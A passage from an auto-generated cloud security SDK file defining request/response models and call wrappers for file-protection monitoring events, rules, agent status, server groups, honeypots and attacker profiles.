  intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.26.XX.XX'),
  operation?: string(name='Operation', description='Type of operation on a file. eg:

- **DELETE**: delete the file.
- **WRITE**: write the file.
- **READ**: read the file.
- **RENAME**: rename the file.
- **CHOWN**: set the file owner and file association group operations.', example='READ'),
  pageSize?: string(name='PageSize', description='The number of entries per page.', example='20'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='test-rule-1'),
  startTime?: long(name='StartTime', description='The start timestamp of the query.', example='1683080489594'),
  status?: string(name='Status', description='The status of the event. Valid values:

*   0: unhandled
*   1: handled
*   2: added to the whitelist
*   3: ignored', example='2'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUID of the server.', example='inet-ecs-4e876cb0-09f7-43b8-82ef-4bc7a937***'),
}

model ListFileProtectEventResponseBody = {
  eventList?: [ 
    {
      alertLevel?: int32(name='AlertLevel', description='The severity of the alert. Valid values:

*   0: no alerts
*   1: reminder
*   2: suspicious
*   3: high-risk', example='1'),
      cmdLine?: string(name='CmdLine', description='The command line of the event.', example='["touch","/test/aaaa"]'),
      filePath?: string(name='FilePath', description='The path to the file that is managed by the process.', example='/etc/pam.d/su'),
      handleTime?: long(name='HandleTime', description='The time when the event was handled.', example='1694576692000'),
      id?: long(name='Id', description='The ID of the event.', example='161757'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='kyy-admin-01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='121.40.211.194'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.22.5.36'),
      latestTime?: long(name='LatestTime', description='The time when the event last occurred.', example='1694576692000'),
      operation?: string(name='Operation', description='The operation performed by the process on the file.', example='DELETE'),
      platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux', example='linux'),
      procPath?: string(name='ProcPath', description='The path to the process.', example='/usr/bin/sshpass'),
      procPermission?: string(name='ProcPermission', description='The permissions required to start the process.', example='rwxr-xr-x'),
      processId?: string(name='ProcessId', description='The ID of the process.', example='52636'),
      remark?: string(name='Remark', description='The description.', example='test'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='test-rule-1'),
      status?: int32(name='Status', description='The status of the event. Valid values:

*   0: unhandled
*   1: handled
*   2: added to the whitelist
*   3: ignored', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server that is associated with the process.', example='94b44720-d982-4d20-a4e1-80a1a57b5a8e'),
    }
  ](name='EventList', description='The events.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
}

model ListFileProtectEventResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListFileProtectEventResponseBody(name='body'),
}

/**
 * @summary Queries core file monitoring rules that meet the specified filter condition.
 *
 * @param request ListFileProtectEventRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListFileProtectEventResponse
 */
async function listFileProtectEventWithOptions(request: ListFileProtectEventRequest, runtime: Util.RuntimeOptions): ListFileProtectEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alertLevels)) {
    query['AlertLevels'] = request.alertLevels;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.internetIp)) {
    query['InternetIp'] = request.internetIp;
  }
  if (!Util.isUnset(request.intranetIp)) {
    query['IntranetIp'] = request.intranetIp;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListFileProtectEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries core file monitoring rules that meet the specified filter condition.
 *
 * @param request ListFileProtectEventRequest
 * @return ListFileProtectEventResponse
 */
async function listFileProtectEvent(request: ListFileProtectEventRequest): ListFileProtectEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return listFileProtectEventWithOptions(request, runtime);
}

model ListFileProtectPluginStatusRequest {
  currentPage?: long(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: long(name='PageSize', description='The number of entries per page.', example='10'),
  switchId?: string(name='SwitchId', description='The ID of the core file monitoring rule.', example='FILE_PROTECT_RULE_SWITCH_TYPE_1693474122927'),
}

model ListFileProtectPluginStatusResponseBody = {
  data?: [ 
    {
      clientVersion?: string(name='ClientVersion', description='The version of the Security Center agent.', example='00_41'),
      installCode?: string(name='InstallCode', description='The returned code after you install the Security Center agent. Valid values:

1.  0: The installation is successful.
2.  \\\\-2: The kernel does not support the installation.', example='-2'),
      installMessage?: string(name='InstallMessage', description='The returned message after you install the Security Center agent.', example='driver file not exist'),
      installed?: boolean(name='Installed', description='Indicates whether the Security Center agent is installed.', example='true'),
      instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
      internetIp?: string(name='InternetIp', description='The public IP address that is associated with the instance.', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address that is associated with the instance.', example='10.42.XX.XX'),
      online?: boolean(name='Online', description='Indicates whether the Security Center agent is online. Valid value:

*   **true**
*   **false**', example='true'),
      platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux', example='linux'),
      supportFile?: boolean(name='SupportFile', description='Indicates whether the core file monitoring file is supported.', example='true'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='The data returned if the call is successful.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='60F289EC-BAA3-5DF1-8476-B3F05A14EBC2'),
}

model ListFileProtectPluginStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListFileProtectPluginStatusResponseBody(name='body'),
}

/**
 * @summary Queries information about the Security Center agent installed on servers on which core file monitoring rules take effect. The information includes the installation status of the Security Center agent and whether the core file monitoring feature is supported.
 *
 * @param request ListFileProtectPluginStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListFileProtectPluginStatusResponse
 */
async function listFileProtectPluginStatusWithOptions(request: ListFileProtectPluginStatusRequest, runtime: Util.RuntimeOptions): ListFileProtectPluginStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.switchId)) {
    query['SwitchId'] = request.switchId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListFileProtectPluginStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about the Security Center agent installed on servers on which core file monitoring rules take effect. The information includes the installation status of the Security Center agent and whether the core file monitoring feature is supported.
 *
 * @param request ListFileProtectPluginStatusRequest
 * @return ListFileProtectPluginStatusResponse
 */
async function listFileProtectPluginStatus(request: ListFileProtectPluginStatusRequest): ListFileProtectPluginStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return listFileProtectPluginStatusWithOptions(request, runtime);
}

model ListFileProtectRuleRequest {
  alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='10'),
  platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux', example='linux'),
  ruleAction?: string(name='RuleAction', description='The handling method of the rule. Valid values:

*   pass: allow
*   alert', example='pass'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='test-rule-1'),
}

model ListFileProtectRuleResponseBody = {
  fileProtectList?: [ 
    {
      action?: string(name='Action', description='The handling method of the rule. Valid values:

*   pass: allow
*   alert', example='pass'),
      alertLevel?: string(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0'),
      effectInstanceCount?: long(name='EffectInstanceCount', description='The total number of affected assets.', example='12'),
      fileOps?: [ string ](name='FileOps', description='The operations performed on the files.'),
      filePaths?: [ string ](name='FilePaths', description='The paths to the monitored files. Wildcard characters are supported.'),
      gmtCreate?: long(name='GmtCreate', description='The time when the rule was created.', example='1682304179000'),
      gmtModified?: long(name='GmtModified', description='The time when the rule was last modified.', example='1682304179000'),
      id?: long(name='Id', description='The ID of the rule.', example='1412511'),
      platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux', example='linux'),
      procPaths?: [ string ](name='ProcPaths', description='The paths to the monitored processes. Wildcard characters are supported.'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='test11'),
      status?: int32(name='Status', description='The status of the rule. Valid values:

*   0: disabled
*   1: enabled', example='1'),
      switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='FILE_PROTECT_RULE_SWITCH_TYPE_1693474122927'),
    }
  ](name='FileProtectList', description='The details of returned data.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='253'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
}

model ListFileProtectRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListFileProtectRuleResponseBody(name='body'),
}

/**
 * @summary Queries core file monitoring rules.
 *
 * @param request ListFileProtectRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListFileProtectRuleResponse
 */
async function listFileProtectRuleWithOptions(request: ListFileProtectRuleRequest, runtime: Util.RuntimeOptions): ListFileProtectRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alertLevel)) {
    query['AlertLevel'] = request.alertLevel;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.ruleAction)) {
    query['RuleAction'] = request.ruleAction;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListFileProtectRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries core file monitoring rules.
 *
 * @param request ListFileProtectRuleRequest
 * @return ListFileProtectRuleResponse
 */
async function listFileProtectRule(request: ListFileProtectRuleRequest): ListFileProtectRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return listFileProtectRuleWithOptions(request, runtime);
}

model ListGroupsRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page 1. Default value: 1.', example='89'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  nextToken?: string(name='NextToken', description='The pagination token that is used in the next request to retrieve a new page of results. If the return value of NextToken is empty, no next query is to be sent. If a value of NextToken is returned, the value indicates the token that is used for the next query.', example='1426C575705AE8545E8360A6EFA3B***'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. Maximum value: 2000.', example='10'),
  useNextToken?: boolean(name='UseNextToken', description='Specifies whether to use NextToken to query vulnerabilities. If you set this parameter to true, TotalCount is not returned. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListGroupsResponseBody = {
  code?: string(name='Code', description='The status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  list?: [ 
    {
      groupFlag?: int32(name='GroupFlag', description='The server group type. Valid values:

*   **0**: default group
*   **1**: other group', example='1'),
      groupId?: long(name='GroupId', description='The server group ID.', example='11028542'),
      groupName?: string(name='GroupName', description='The server group name.', example='cn-shenzhen+dir-1440978***'),
    }
  ](name='List', description='The groups.'),
  message?: string(name='Message', description='The error message.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    nextToken?: string(name='NextToken', description='A pagination token. It can be used in the next request to retrieve a new page of results.', example='B604532DEF982B875E8360A6EFA3B***'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='202'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='CB414DB5-F692-5DAB-9F0F-975C060AF***'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListGroupsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListGroupsResponseBody(name='body'),
}

/**
 * @summary Queries the server groups.
 *
 * @param request ListGroupsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListGroupsResponse
 */
async function listGroupsWithOptions(request: ListGroupsRequest, runtime: Util.RuntimeOptions): ListGroupsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nextToken)) {
    query['NextToken'] = request.nextToken;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.useNextToken)) {
    query['UseNextToken'] = request.useNextToken;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListGroups',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the server groups.
 *
 * @param request ListGroupsRequest
 * @return ListGroupsResponse
 */
async function listGroups(request: ListGroupsRequest): ListGroupsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listGroupsWithOptions(request, runtime);
}

model ListHoneypotRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  honeypotIds?: [ string ](name='HoneypotIds', description='The IDs of the honeypots.'),
  honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='mx-rouyi'),
  nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='honeypot_master'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
}

model ListHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='0804-pre'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='76c2a1c72ef259777d96d55a7834e5f5d98f85666c49f76ad9caa447d8b7****'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='MongoDB'),
      honeypotImageId?: string(name='HoneypotImageId', description='The ID of the honeypot image.', example='sha256:eca5ced3757e46c24701e9ced4e652f2d730262d5685a4e001da22c4fb418fd4'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='tcp_proxy'),
      honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='mx-rouyi'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='c94eff5b-ea48-4805-8b7f-e04d3509b117'),
      presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
      state?: [ string ](name='State', description='An array that consists of the status information about the honeypot.'),
    }
  ](name='List', description='An array that consists of the information about the honeypots.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C80AFF1F-CC20-502C-A4D4-F5433E529B69'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotResponseBody(name='body'),
}

/**
 * @summary Queries the information about honeypots.
 *
 * @param request ListHoneypotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotResponse
 */
async function listHoneypotWithOptions(request: ListHoneypotRequest, runtime: Util.RuntimeOptions): ListHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotIds)) {
    query['HoneypotIds'] = request.honeypotIds;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about honeypots.
 *
 * @param request ListHoneypotRequest
 * @return ListHoneypotResponse
 */
async function listHoneypot(request: ListHoneypotRequest): ListHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotWithOptions(request, runtime);
}

model ListHoneypotAlarmEventsRequest {
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  dstIp?: string(name='DstIp'),
  pageSize?: int32(name='PageSize'),
  riskLevelList?: [ string ](name='RiskLevelList'),
  srcIp?: string(name='SrcIp'),
}

model ListHoneypotAlarmEventsResponseBody = {
  honeypotAlarmEvents?: [ 
    {
      alarmEventId?: long(name='AlarmEventId', description='The event ID.', example='940272'),
      alarmEventName?: string(name='AlarmEventName', description='The name of the alert event.', example='Attack Honeypot'),
      alarmEventType?: string(name='AlarmEventType', description='The type of the alert event.', example='Initial Access'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique identifier of the alert event.', example='167e6fc0d931917d2059efcd1d00f6ab'),
      eventCount?: int32(name='EventCount', description='The total number of times that the alert event was generated.', example='11'),
      firstTime?: long(name='FirstTime', description='The timestamp that indicates the time when the alert event was first detected. Unit: milliseconds.', example='1658193602000'),
      lastTime?: long(name='LastTime', description='The timestamp that indicates the time when the alert event was last detected. Unit: milliseconds.', example='1660610772000'),
      mergeFieldList?: [ 
        {
          fieldExtInfo?: string(name='FieldExtInfo', description='The extended value that corresponds to the field key.', example='dest_ip_ext'),
          fieldKey?: string(name='FieldKey', description='The key of the field.', example='dest_ip_count'),
          fieldType?: string(name='FieldType', description='The type of the field. You can ignore this internal parameter.', example='level1_item3'),
          fieldValue?: string(name='FieldValue', description='The value that corresponds to the field key.', example='1'),
        }
      ](name='MergeFieldList', description='The risk information.'),
      operateStatus?: int32(name='OperateStatus', description='The handling status of the alert event. Valid values:

*   **1**: pending
*   **2**: ignored
*   **4**: confirmed', example='1'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **2**: low
*   **3**: medium
*   **4**: high', example='2'),
    }
  ](name='HoneypotAlarmEvents', description='The alert events.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 100.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='513C9554-55A4-5504-B7C4-6E17EB4FC7A3'),
}

model ListHoneypotAlarmEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotAlarmEventsResponseBody(name='body'),
}

/**
 * @summary Queries the information about alert events that are generated.
 *
 * @param request ListHoneypotAlarmEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotAlarmEventsResponse
 */
async function listHoneypotAlarmEventsWithOptions(request: ListHoneypotAlarmEventsRequest, runtime: Util.RuntimeOptions): ListHoneypotAlarmEventsResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotAlarmEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about alert events that are generated.
 *
 * @param request ListHoneypotAlarmEventsRequest
 * @return ListHoneypotAlarmEventsResponse
 */
async function listHoneypotAlarmEvents(request: ListHoneypotAlarmEventsRequest): ListHoneypotAlarmEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotAlarmEventsWithOptions(request, runtime);
}

model ListHoneypotAttackerPortraitRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**. Pages start from page 1.', example='1'),
  endTimeStamp?: long(name='EndTimeStamp', description='The end of the time range to query. The value is a UNIX timestamp.', example='1672285044000'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  srcIp?: string(name='SrcIp', description='The source IP address of the attack.', example='101.133.155.***'),
  startTimeStamp?: long(name='StartTimeStamp', description='The beginning of the time range to query. The value is a UNIX timestamp.', example='1672249044000'),
}

model ListHoneypotAttackerPortraitResponseBody = {
  code?: string(name='Code', description='The status code that is returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  list?: [ 
    {
      attackCount?: int32(name='AttackCount', description='The number of attacks.', example='10'),
      browser?: [ string ](name='Browser', description='The information about the browsers of the attack source.'),
      host?: [ string ](name='Host', description='The information about the hosts of the attack source.'),
      lastTime?: long(name='LastTime', description='The timestamp at which the attack was last detected. Unit: milliseconds.', example='1679896965'),
      network?: {
        externalIp?: [ string ](name='ExternalIp', description='The public IP addresses.'),
        internalIp?: [ string ](name='InternalIp', description='The private IP addresses.'),
        realIp?: [ string ](name='RealIp', description='The originating IP addresses.'),
      }(name='Network', description='The network information about the attack source.'),
      portraitId?: string(name='PortraitId', description='The attacker profile ID.', example='cd48604a-1694-4f03-ade0-ec6994c3****'),
      social?: [ string ](name='Social', description='The social information about the attack source.'),
    }
  ](name='List', description='The details of the attacker profile.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='11'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='2'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='25'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='8A5A2DA6-67EA-5968-960F-6B20FD0C*****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListHoneypotAttackerPortraitResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotAttackerPortraitResponseBody(name='body'),
}

/**
 * @summary Queries the attacker profile based on the source IP address of the attack.
 *
 * @param request ListHoneypotAttackerPortraitRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotAttackerPortraitResponse
 */
async function listHoneypotAttackerPortraitWithOptions(request: ListHoneypotAttackerPortraitRequest, runtime: Util.RuntimeOptions): ListHoneypotAttackerPortraitResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTimeStamp)) {
    query['EndTimeStamp'] = request.endTimeStamp;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.srcIp)) {
    query['SrcIp'] = request.srcIp;
  }
  if (!Util.isUnset(request.startTimeStamp)) {
    query['StartTimeStamp'] = request.startTimeStamp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotAttackerPortrait',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the attacker profile based on the source IP address of the attack.
 *
 * @param request ListHoneypotAttackerPortraitRequest
 * @return ListHoneypotAttackerPortraitResponse
 */
async function listHoneypotAttackerPortrait(request: ListHoneypotAttackerPortraitRequest): ListHoneypotAttackerPortraitResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotAttackerPortraitWithOptions(request, runtime);
}

model ListHoneypotAttackerSourceRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  endTimeStamp?: long(name='EndTimeStamp', description='The end of the time range to query. This value is a timestamp.', example='1676945366221'),
